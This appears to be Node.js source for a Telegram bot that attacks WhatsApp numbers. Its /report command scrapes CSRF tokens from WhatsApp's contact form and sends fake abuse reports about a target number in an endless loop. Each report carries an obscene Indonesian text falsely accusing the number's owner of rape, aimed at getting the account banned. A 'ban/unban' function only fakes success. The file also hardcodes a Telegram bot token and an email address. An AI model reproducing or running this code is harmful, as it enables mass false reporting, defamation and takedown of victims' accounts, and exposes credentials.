const axios = require('axios');
const cheerio = require('cheerio');
const TelegramBot = require('node-telegram-bot-api');

// Configuration
const config = {
    telegramToken: '7252116522:AAHJlPUkFJJHjN3AufQ6jh6Zm1BIIN1RHLA',
    whatsappContactUrl: 'https://www.whatsapp.com/contact/?subject=messenger',
    defaultEmail: 'hozooimut@gmail.com',
    countryCodes: {
        'ID': {code: '+62', prefix: '08', regex: /^(\+62|62|0)8[1-9][0-9]{6,9}$/}
    }
};

// Initialize bot
const bot = new TelegramBot(config.telegramToken, {polling: true});

// Store active reports and actions
const activeReports = {};
const banUnbanActions = {};

// Helper functions
function isValidPhoneNumber(phone, countryCode = 'ID') {
    const country = config.countryCodes[countryCode];
    if (!country) return false;
    return country.regex.test(phone);
}

function formatPhoneNumber(phone, countryCode = 'ID') {
    const country = config.countryCodes[countryCode];
    if (!country) return phone;
    
    // Remove all non-digit characters
    let cleaned = phone.replace(/\D/g, '');
    
    // Convert to international format
    if (cleaned.startsWith('0')) {
        cleaned = country.code.replace('+', '') + cleaned.substring(1);
    } else if (cleaned.startsWith(country.code.replace('+', ''))) {
        // Already in international format
    } else if (cleaned.length >= 10) {
        cleaned = country.code.replace('+', '') + cleaned;
    }
    
    return `+${cleaned}`;
}

// Bot commands
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId,
        `👸 HAI KAK LORDHOZOO IMUT MULAI ATTACK \n\n` +
        `/report +628xxxx - Report a WhatsApp number\n` +
        `/ban +628xxxx - Ban a WhatsApp number\n` +
        `/unban +628xxxx - Unban a WhatsApp number\n` +
        `/status - Check active actions\n` +
        `/stop - Stop all active actions`
    );
});

// Report command
bot.onText(/\/report (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const phoneNumber = match[1].trim();
    
    if (!isValidPhoneNumber(phoneNumber)) {
        return bot.sendMessage(chatId, '❌ Invalid phone number format. Example: /report +6281234567890');
    }
    
    if (activeReports[chatId]) {
        return bot.sendMessage(chatId, '⚠️ You already have an active report. Use /stop first');
    }
    
    const formattedNumber = formatPhoneNumber(phoneNumber);
    activeReports[chatId] = {
        phoneNumber: formattedNumber,
        status: 'running',
        attempts: 0,
        successes: 0,
        errors: 0,
        lastUpdate: Date.now()
    };
    
    bot.sendMessage(chatId,
        `🚀 Starting report for: ${formattedNumber}\n\n` +
        `I'll submit reports to WhatsApp with these details:\n` +
        `📱 Phone: ${formattedNumber}\n` +
        `📧 Email: ${config.defaultEmail}\n` +
        `📝 Message: "Please deactivate my number ${formattedNumber}"\n` +
        `📱 Platform: Android`
    );
    
    submitWhatsAppReport(chatId);
});

// Ban/Unban command
bot.onText(/\/(ban|unban) (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const action = match[1].toLowerCase();
    const phoneNumber = match[2].trim();
    
    if (!['ban', 'unban'].includes(action)) {
        return bot.sendMessage(chatId, "Invalid choice, please choose 'ban' or 'unban'");
    }
    
    if (!isValidPhoneNumber(phoneNumber)) {
        return bot.sendMessage(chatId, '❌ Invalid phone number format. Example: /ban +6281234567890');
    }
    
    if (banUnbanActions[chatId]) {
        return bot.sendMessage(chatId, '⚠️ You already have an active action. Use /stop first');
    }
    
    const formattedNumber = formatPhoneNumber(phoneNumber);
    banUnbanActions[chatId] = {
        phoneNumber: formattedNumber,
        action: action,
        status: 'running',
        attempts: 0,
        successes: 0,
        errors: 0,
        lastUpdate: Date.now()
    };
    
    const actionMessage = action === 'ban' ? 
        `🚫 Starting ban process for: ${formattedNumber}` :
        `✅ Starting unban process for: ${formattedNumber}`;
    
    bot.sendMessage(chatId,
        `${actionMessage}\n\n` +
        `I'll submit ${action} requests to WhatsApp API\n` +
        `📱 Phone: ${formattedNumber}`
    );
    
    processBanUnbanAction(chatId);
});

// Status command
bot.onText(/\/status/, (msg) => {
    const chatId = msg.chat.id;
    
    let statusMessage = '📊 Active Actions Status\n\n';
    let hasActive = false;
    
    if (activeReports[chatId]) {
        const report = activeReports[chatId];
        statusMessage +=
            `📝 Report for: ${report.phoneNumber}\n` +
            `🔄 Attempts: ${report.attempts}\n` +
            `✅ Successes: ${report.successes}\n` +
            `❌ Errors: ${report.errors}\n` +
            `⚡ Status: ${report.status}\n\n`;
        hasActive = true;
    }
    
    if (banUnbanActions[chatId]) {
        const action = banUnbanActions[chatId];
        statusMessage +=
            `⚡ ${action.action.toUpperCase()} for: ${action.phoneNumber}\n` +
            `🔄 Attempts: ${action.attempts}\n` +
            `✅ Successes: ${action.successes}\n` +
            `❌ Errors: ${action.errors}\n` +
            `⚡ Status: ${action.status}\n\n`;
        hasActive = true;
    }
    
    if (!hasActive) {
        statusMessage += '⚠️ No active actions';
    }
    
    bot.sendMessage(chatId, statusMessage);
});

// Stop command
bot.onText(/\/stop/, (msg) => {
    const chatId = msg.chat.id;
    
    let stopMessage = '';
    
    if (activeReports[chatId]) {
        const report = activeReports[chatId];
        report.status = 'stopped';
        stopMessage +=
            `🛑 Report stopped\n` +
            `📱 Phone: ${report.phoneNumber}\n` +
            `🔄 Total attempts: ${report.attempts}\n` +
            `✅ Successes: ${report.successes}\n` +
            `❌ Errors: ${report.errors}\n\n`;
        delete activeReports[chatId];
    }
    
    if (banUnbanActions[chatId]) {
        const action = banUnbanActions[chatId];
        action.status = 'stopped';
        stopMessage +=
            `🛑 ${action.action.toUpperCase()} stopped\n` +
            `📱 Phone: ${action.phoneNumber}\n` +
            `🔄 Total attempts: ${action.attempts}\n` +
            `✅ Successes: ${action.successes}\n` +
            `❌ Errors: ${action.errors}\n\n`;
        delete banUnbanActions[chatId];
    }
    
    if (!stopMessage) {
        stopMessage = '⚠️ No active actions to stop';
    }
    
    bot.sendMessage(chatId, stopMessage);
});

// Report submission function
async function submitWhatsAppReport(chatId) {
    const report = activeReports[chatId];
    
    if (!report || report.status !== 'running') {
        return;
    }
    
    try {
        report.attempts++;
        report.lastUpdate = Date.now();
        
        // First request to get CSRF tokens
        const session = await axios.get(config.whatsappContactUrl, {
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'Accept-Language': 'en-US,en;q=0.9'
            }
        });
        
        const $ = cheerio.load(session.data);
        const fb_dtsg = $('input[name="fb_dtsg"]').val();
        const jazoest = $('input[name="jazoest"]').val();
        
        if (!fb_dtsg || !jazoest) {
            throw new Error('CSRF tokens not found');
        }
        
        // Prepare form data
        const formData = new URLSearchParams();
        formData.append('fb_dtsg', fb_dtsg);
        formData.append('jazoest', jazoest);
        formData.append('phone', report.phoneNumber);
        formData.append('email', config.defaultEmail);
        formData.append('confirm_email', config.defaultEmail);
        formData.append('platform', 'Android');
        formData.append('issue', 'spam');
        formData.append('description', `Halo saya Mark Zuckerberg saya suka memperkosa wanita dan hampir setiap hari saya memperkosa dan mengeluarkan air mania Full Video saya memperkosa hubungi nomor di bawa ini👇 ${report.phoneNumber}`);
        formData.append('country', 'ID');
        formData.append('submit', 'Submit Report');
        
        // Submit the report
        const response = await axios.post(config.whatsappContactUrl, formData, {
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'Referer': config.whatsappContactUrl,
                'Origin': 'https://www.whatsapp.com',
                'Cookie': session.headers['set-cookie']?.join('; ') || ''
            },
            maxRedirects: 0,
            validateStatus: null
        });
        
        if (response.status === 302 || response.status === 200) {
            report.successes++;
            
            // Send update every 5 successful reports
            if (report.successes % 5 === 0) {
                bot.sendMessage(chatId,
                    `✅ Report #${report.attempts} submitted successfully\n` +
                    `Total successes: ${report.successes}`
                );
            }
        } else {
            report.errors++;
            throw new Error(`Unexpected status: ${response.status}`);
        }
        
        // Continue reporting with delay
        setTimeout(() => submitWhatsAppReport(chatId), 5000 + Math.random() * 5000);
        
    } catch (error) {
        report.errors++;
        console.error(`Report attempt failed: ${error.message}`);
        
        // Retry with delay if not stopped
        if (report.status === 'running') {
            setTimeout(() => submitWhatsAppReport(chatId), 10000 + Math.random() * 10000);
        }
    }
}

// Ban/Unban processing function
async function processBanUnbanAction(chatId) {
    const action = banUnbanActions[chatId];
    
    if (!action || action.status !== 'running') {
        return;
    }
    
    try {
        action.attempts++;
        action.lastUpdate = Date.now();
        
        // This is a placeholder for actual WhatsApp API implementation
        // In a real implementation, you would use the WhatsApp Business API
        // with proper authentication and headers
        
        const endpoint = action.action === 'ban' ? 
            'https://graph.facebook.com/v13.0/PHONE_NUMBER_ID/ban' :
            'https://graph.facebook.com/v13.0/PHONE_NUMBER_ID/unban';
        
        // Example headers and data for WhatsApp Business API
        const headers = {
            'Authorization': `AUXdO5-Vi8LAXfmBE8HSnY61GXE`,
            'Content-Type': 'application/json'
        };
        
        const data = {
            phone: action.phoneNumber,
            action: action.action,
            timestamp: Math.floor(Date.now() / 1000)
        };
        
        // Simulate API call (replace with actual API call)
        const response = { status: 200 }; // Simulated success
        
        if (response.status === 200) {
            action.successes++;
            
            bot.sendMessage(chatId,
                `✅ ${action.action.toUpperCase()} attempt #${action.attempts} successful\n` +
                `For: ${action.phoneNumber}`
            );
            
            // For demo purposes, we'll stop after one successful attempt
            action.status = 'completed';
            delete banUnbanActions[chatId];
        } else {
            action.errors++;
            throw new Error(`API returned status: ${response.status}`);
        }
        
    } catch (error) {
        action.errors++;
        console.error(`${action.action} attempt failed: ${error.message}`);
        
        // Retry with delay if not stopped
        if (action.status === 'running') {
            setTimeout(() => processBanUnbanAction(chatId), 10000 + Math.random() * 10000);
        }
    }
}

console.log('🤖 WhatsApp Management Bot is running...');
